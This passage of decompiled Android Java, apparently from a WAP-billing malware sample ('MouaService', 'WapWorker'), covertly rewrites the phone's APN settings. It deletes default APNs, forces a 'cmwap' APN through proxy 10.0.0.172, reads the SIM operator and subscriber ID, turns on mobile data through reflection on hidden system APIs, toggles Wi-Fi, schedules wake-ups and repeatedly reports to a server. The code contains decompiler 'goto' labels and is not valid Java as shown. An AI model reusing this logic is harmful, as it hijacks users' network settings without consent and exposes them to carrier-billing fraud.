            v17 = v10.getString(v10.getColumnIndex("name"));
            String v22 = v10.getString(v10.getColumnIndex("apn"));
            if(!v17.equalsIgnoreCase("default")) {
                continue;
            }

            if(!v22.equalsIgnoreCase("cmwap")) {
                continue;
            }

            MouaService.log.trace("set_apn", "delete apn id=" + v25);
            context.getContentResolver().delete(Constants.APN_URI, "_id=" + v25, null);
        }

        v10.close();
        Object v23 = MouaService.ctx.getSystemService("phone");
        if(v23 == null) {
            return false;
        }

        String v19 = ((TelephonyManager)v23).getSimOperator();
        String v14 = ((TelephonyManager)v23).getSubscriberId();
        if(v19.length() > 0) {
            v18 = v19;
        }
        else if(v14.length() <= 0) {
            return false;
        }
        else {
            v18 = v14.substring(0, 5);
        }

        if(!v18.equals("46003") && !v19.contains("46003")) {
            MouaService.ischinatel = 0;
            if(CommUtil.getstrlen(v18) == 0) {
                v4 = false;
            }
            else {
                String v15 = v18.substring(0, 3);
                String v16 = v18.substring(3);
                ContentResolver v2 = context.getContentResolver();
                ContentValues v11 = new ContentValues();
                v11.put("name", "default");
                v11.put("apn", "cmwap");
                v11.put("proxy", "10.0.0.172");
                v11.put("port", "80");
                v11.put("mcc", v15);
                v11.put("mnc", v16);
                v11.put("numeric", v18);
                v11.put("current", Integer.valueOf(1));
                v11.put("authtype", Integer.valueOf(0));
                v11.put("type", "default");
                this.addOtherValues(v11);
                Cursor v9 = null;
                String v8 = null;
                try {
                    Uri v3 = v2.insert(Constants.APN_URI, v11);
                    if(v3 != null) {
                        v9 = v2.query(v3, null, null, null, null);
                        v9.moveToFirst();
                        v8 = v9.getString(v9.getColumnIndex("_id"));
                        MouaService.log.trace("set_apn", "add apn id:" + v8);
                    }
                }
                catch(SecurityException v12) {
                    MouaService.log.trace("set_apn", v12.toString());
                    return false;
                }
                catch(SQLException v12_1) {
                    MouaService.log.trace("set_apn", v12_1.toString());
                    return false;
                }

                if(v9 != null) {
                    v9.close();
                }

                int v13 = Integer.parseInt(v8);
                if(v13 == -1) {
                    return false;
                }

                ContentResolver v21 = context.getContentResolver();
                ContentValues v24 = new ContentValues();
                v24.put("apn_id", Integer.valueOf(v13));
                if(v21.update(Constants.CURRENT_APN_URI, v24, null, null) > 0) {
                    MouaService.log.trace("set_apn", "change apn to " + v17 + " id is " + v25);
                    return true;
                }

                MouaService.log.trace("set_apn", "change apn to ERROR");
                v4 = false;
            }
        }
        else {
            MouaService.ischinatel = 1;
            v4 = false;
        }

        return v4;
    }

    private boolean set_apn_byname(String name_s, String name_b) {
        boolean v2;
        int v11 = 0;
        try {
            String v17 = "0";
            String v13 = "";
            String v9 = "";
            Cursor v8 = MouaService.ctx.getContentResolver().query(Constants.APN_URI, null, null, null, null);
            do {
                if(v8 != null && (v8.moveToNext())) {
                    v17 = v8.getString(v8.getColumnIndex("_id"));
                    v13 = v8.getString(v8.getColumnIndex("apn"));
                    String v15 = v8.getString(v8.getColumnIndex("type"));
                    if(!v13.contains(name_s) && !v13.contains(name_b)) {
                        continue;
                    }

                    if(v15.contains("mms")) {
                        continue;
                    }

                    break;
                }

                goto label_16;
            }
            while(true);

            v11 = 1;
        label_16:
            v8.close();
            v8 = MouaService.ctx.getContentResolver().query(Constants.CURRENT_APN_URI, null, null, null, null);
            if(v8 != null && (v8.moveToNext())) {
                v9 = v8.getString(v8.getColumnIndex("apn"));
                MouaService.log.trace("currentname", v9);
            }

            v8.close();
            if(v9.equalsIgnoreCase(v13)) {
                MouaService.log.trace("set_apn_byname", "eq");
                v2 = true;
                return v2;
            }

            MouaService.log.trace("set_apn_byname", "1");
            if(v11 == 0) {
                goto label_105;
            }

            MouaService.log.trace("set_apn_byname", "2");
            int v12 = this.str2int(v17);
            if(v12 == -1) {
                v2 = false;
            }
            else {
                MouaService.log.trace("set_apn_byname", "3");
                ContentResolver v14 = MouaService.ctx.getContentResolver();
                ContentValues v16 = new ContentValues();
                v16.put("apn_id", Integer.valueOf(v12));
                MouaService.log.trace("set_apn_byname", "4");
                v14.update(Constants.CURRENT_APN_URI, v16, null, null);
                MouaService.log.trace("change apn to", v13);
                return true;
            label_105:
                MouaService.log.trace("find no apn ,only:", v13);
                v2 = false;
            }

            return v2;
        }
        catch(Exception v10) {
            MouaService.log.trace("change apn ", String.valueOf(name_s) + "  fail");
            return false;
        }
    }

    private int setwapiap() {
        int v7 = -1;
        boolean v0 = this.deletedefaultapn();
        MouaService.log.trace("delete apn", "default");
        if(v0) {
            if(MouaService.mversion < 10) {
                int v3 = this.addapn();
                MouaService.log.trace("setwapiap", "add apn default,id=" + v3);
                if(v3 >= 0) {
                    try {
                        ContentResolver v5 = MouaService.ctx.getContentResolver();
                        ContentValues v6 = new ContentValues();
                        v6.put("apn_id", Integer.valueOf(v3));
                        v5.update(Constants.CURRENT_APN_URI, v6, null, null);
                    }
                    catch(Exception v1) {
                        MouaService.log.trace("setwapiap", "add apn default failed.");
                        return v7;
                    }
                }
                else if(v3 != -2) {
                    MouaService.log.trace("init apn", "error to set default apn");
                    if(this.adddefalutapn() == v7) {
                        MouaService.log.trace("init apn", "add defalult apn error");
                        return v7;
                    }
                }
                else if(!this.set_apn_byname("ctwap", "CTWAP")) {
                    MouaService.log.trace("ctwap", "fail");
                    return v7;
                }
            }
            else if(!this.set_apn_byname("cmwap", "CMWAP")) {
                if(this.set_apn_byname("3gwap", "3GWAP")) {
                    goto label_41;
                }

                return v7;
            }

        label_41:
            v7 = 0;
        }
        else {
            MouaService.log.trace("delete default", "fail");
        }

        return v7;
    }

    private void setwifi(boolean v) {
        if(this.wm == null) {
            this.wm = MouaService.ctx.getSystemService("wifi");
        }

        MouaService.log.trace("wifi", "set");
        if(v) {
            if(!this.wm.isWifiEnabled()) {
                this.wm.setWifiEnabled(true);
            }

            MouaService.log.trace("wifi", "open");
        }
        else {
            if(this.wm.isWifiEnabled()) {
                this.wm.setWifiEnabled(false);
            }

            MouaService.log.trace("wifi", "close");
        }
    }

    private void sleeptimer(long minutes, Class mClass) {
        this.setwifi(true);
        long v2 = 60 * minutes * 1000;
        MouaService.log.trace("sleep time", v2);
        Intent v1 = new Intent(MouaService.ctx, mClass);
        v1.setAction("goon");
        MouaService.ctx.getSystemService("alarm").set(0, System.currentTimeMillis() + v2, PendingIntent.getBroadcast(MouaService.ctx, 0, v1, 0));
        MouaService.log.trace("sleep time", "Minutes:" + minutes);
    }

    private int startlongtimer(Class mClass) {
        IniReader v0;
        int v4 = -1;
        MouaService.log.trace("time", "start long timer");
        try {
            v0 = new IniReader(new FileReader(Constants.CONFIG_PATH(MouaService.ctx)));
        }
        catch(IOException v2) {
            return v4;
        }

        String v3 = v0.getValue("time", "nexttime");
        if(CommUtil.getstrlen(v3) <= 0) {
            goto label_32;
        }

        MouaService.log.trace("nextime", v3);
        int v1 = this.str2int(v3);
        if(v1 > 0) {
            this.sleeptimer(((long)v1), mClass);
            v4 = 0;
        }
        else {
            MouaService.log.trace("servlog", "delay less 0");
            return v4;
        label_32:
            MouaService.log.trace("servlog", "nextime is null");
        }

        return v4;
    }

    private int str2int(String str) {
        int v2;
        try {
            v2 = Integer.parseInt(str);
        }
        catch(NumberFormatException v0) {
            v2 = -1;
        }

        return v2;
    }

    public void testentry() {
        new WapWorker(MouaService.ctx).dotestAction();
    }

    public void toggleMobileData(Context context, boolean enabled) {
        Object v0 = context.getSystemService("connectivity");
        try {
            Field v5 = Class.forName(v0.getClass().getName()).getDeclaredField("mService");
            v5.setAccessible(true);
            Object v3 = v5.get(v0);
            Method v6 = Class.forName(v3.getClass().getName()).getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
            v6.setAccessible(true);
            v6.invoke(v3, Boolean.valueOf(enabled));
        }
        catch(InvocationTargetException v2) {
            v2.printStackTrace();
        }
        catch(IllegalAccessException v2_1) {
            v2_1.printStackTrace();
        }
        catch(IllegalArgumentException v2_2) {
            v2_2.printStackTrace();
        }
        catch(NoSuchMethodException v2_3) {
            v2_3.printStackTrace();
        }
        catch(SecurityException v2_4) {
            v2_4.printStackTrace();
        }
        catch(NoSuchFieldException v2_5) {
            v2_5.printStackTrace();
        }
        catch(ClassNotFoundException v2_6) {
            v2_6.printStackTrace();
        }
    }

    private void tryreport(boolean b, int step) {
        int v0 = this.report(b, step);
        if(v0 != 0) {
            this.report(b, step);
        }

        if(v0 != 0) {
            this.report(b, step);
        }
    }
}

